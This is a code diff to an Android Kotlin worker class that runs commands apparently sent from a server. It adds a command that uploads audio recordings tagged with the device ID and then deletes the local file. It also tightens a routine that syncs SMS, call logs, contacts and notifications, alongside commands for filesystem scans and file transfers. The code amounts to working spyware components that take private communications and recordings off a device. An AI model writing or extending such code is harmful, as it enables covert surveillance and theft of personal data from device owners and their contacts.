@@ -1,3 +1,4 @@
+// DataFetchWorker.kt
 package com.elfinsaddle.worker
 
 import android.Manifest
@@ -28,6 +29,9 @@ class DataFetchWorker(
     companion object {
         private const val TAG = "DataFetchWorker"
         const val KEY_COMMAND = "command"
+        const val KEY_FILE_PATH = "filePath" // Re-used for file uploads
+        const val COMMAND_UPLOAD_AUDIO_RECORDING = "upload_audio_recording"
+
         const val COMMAND_SYNC_ALL = "sync_all"
         const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications"
         const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
@@ -86,6 +90,7 @@ class DataFetchWorker(
             COMMAND_UPLOAD_FILE -> uploadRequestedFile()
             COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
             COMMAND_PING -> sendPingResponse()
+            COMMAND_UPLOAD_AUDIO_RECORDING -> uploadAudioRecording()
             else -> {
                 Log.w(TAG, "Unknown command received: $command")
                 false
@@ -95,19 +100,34 @@ class DataFetchWorker(
 
     private suspend fun syncAllData(): Boolean {
         Log.i(TAG, "Starting full differential data sync...")
-        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) {
-            deviceRepository.syncSms() is NetworkResult.Success
-        } else true
-        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) {
-            deviceRepository.syncCallLogs() is NetworkResult.Success
-        } else true
-        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) {
-            deviceRepository.syncContacts() is NetworkResult.Success
-        } else true
+        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms() is NetworkResult.Success else true
+        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs() is NetworkResult.Success else true
+        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts() is NetworkResult.Success else true
         val notificationsSuccess = deviceRepository.syncNotifications() is NetworkResult.Success
-
-        Log.i(TAG, "Full sync results -> SMS: $smsSuccess, CallLogs: $callLogSuccess, Contacts: $contactsSuccess, Notifications: $notificationsSuccess")
         return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess
+    }
+
+    private suspend fun uploadAudioRecording(): Boolean {
+        val filePath = inputData.getString(KEY_FILE_PATH) ?: run {
+            Log.e(TAG, "Audio upload failed: file path not provided.")
+            return true // Return true to not retry a job that can't succeed
+        }
+        val file = File(filePath)
+        if (!file.exists()) {
+            Log.e(TAG, "Audio upload failed: file does not exist at path $filePath")
+            return true // Don't retry if the file is gone
+        }
+
+        Log.d(TAG, "Uploading audio recording from: $filePath")
+        val result = apiClient.uploadAudioRecording(file, systemInfoManager.getDeviceId())
+
+        if (result is NetworkResult.Success) {
+            Log.i(TAG, "Successfully uploaded audio recording. Deleting local file.")
+            file.delete()
+        } else {
+            Log.e(TAG, "Failed to upload audio recording. The file will be kept for the next retry.")
+        }
+        return result is NetworkResult.Success
     }
 
     private suspend fun uploadRequestedFile(): Boolean {
